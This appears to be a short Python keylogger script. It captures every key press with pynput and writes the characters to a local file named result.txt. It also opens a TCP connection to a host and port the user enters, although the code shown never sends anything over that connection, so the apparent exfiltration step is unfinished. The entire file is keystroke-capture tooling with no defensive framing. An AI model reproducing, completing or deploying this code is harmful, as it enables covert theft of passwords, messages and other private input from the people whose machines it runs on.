import pynput
from pynput import keyboard
import socket
import time
import json

TCP_IP = input("Enter your TCP IP: ")
TCP_PORT = int(input("Enter your TCP Port: "))  # Ensure port is an integer
BUFFER_SIZE = 1024

# Socket connection setup
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
except socket.error as e:
    print(f"Socket error: {e}")
    exit(1)

def on_press(key):
    try:
        # Log the key press to a file
        with open("result.txt", "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys
        with open("result.txt", "a") as f:
            f.write(f'{key}')
    except Exception as e:
        print(f"Error: {e}")

    # Exit on 'Esc' key press
    if key == keyboard.Key.esc:
        return False

def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setup listener for key press and release
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Listener error: {e}")
finally:
    # Ensure socket is closed properly
    s.close()

